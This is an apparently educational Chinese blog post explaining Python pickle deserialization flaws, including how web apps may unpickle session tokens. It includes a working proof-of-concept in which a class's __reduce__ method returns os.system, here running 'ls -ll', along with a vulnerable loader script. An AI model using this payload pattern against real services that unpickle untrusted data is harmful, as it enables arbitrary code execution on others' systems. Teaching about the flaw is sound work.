---
title: Python反序列化漏洞
date: 2018-05-18 10:35:21
categories: 安全
tags: 安全
---

## pickle 简介
pickle 提供了一个简单的持久化功能，可以将对象以文件的形式存放在磁盘上。pickle 模块只能在 python 中使用，python 中几乎所有的数据类型（列表，字典，集合，类等）都可以用 pickle 来序列化，pickle 序列化后的数据，可读性差，人一般无法识别。


### pickle.dump(obj, file[, protocol])
序列化对象，并将结果数据流写入到文件对象中。参数 protocol 是序列化模式，默认值为 0，表示以文本的形式序列化。protocol 的值还可以是 1 或 2，表示以二进制的形式序列化。

### pickle.load(file)
反序列化对象，将文件中的数据解析为一个 Python 对象。

## pickle 在 web 开发中的应用
在 web 开发中，pickle 一般用来解析 token 或者 session。假设一个网站（web 服务）是用 python 来写的，然后在数据库中存放着序列化的字符串，这些字符串可能是被用作 token 或者 session。当服务器上的 web 服务需要使用一个用户的 token 或者 session 的时候，首先要查库得到 token 或者 session，然后再将其反序列化为 python 对象。而 Picke 是可以执行 python 代码的。

## 漏洞原理演示

### 包含漏洞的代码 exploit_pickle.py

以下代码会反序列化 poc.pickle 文件（相当于上面提到的存在数据库中的 token 或者 session）。我们通过合理的构造一个 poc.pickle 文件，这个文件中包含我们想要执行的命令，就可以触发漏洞了，包含在 poc.pickle 中的命令会被执行。
```
# encoding: utf-8

import pickle
pickle.load(open('poc.pickle'))
```

### 构造 poc.pickle 文件 gen_poc_pickle.py

这里我们构造的 poc.pickle 文件里包含的命令为“ls -ll”，当上述包含漏洞的代码反序列化 poc.pickle 文件时，会执行“os.system("ls -ll")”。

```
import cPickle
import os

class exp(object):

    def __reduce__(self):
        ser = 'ls -ll'  # 在这里包含我们想要执行的命令
        return (os.system, (ser,))

if __name__ == '__main__':
    e = exp()
    ser = cPickle.dumps(e)
    print(ser)
```

执行以下命令得到 poc.pickle
```
python gen_poc_pickle.py > poc.pickle
```

### 执行漏洞程序
执行漏洞程序，poc.pickle 文件被反序列化，我们的命令也被执行了。
```
python exploit_pickle.py
```
## 参考
[掌阅iReader某站Python漏洞挖掘](https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html)
[Python Pickle的任意代码执行漏洞实践和Payload构造](http://www.polaris-lab.com/index.php/archives/178/)

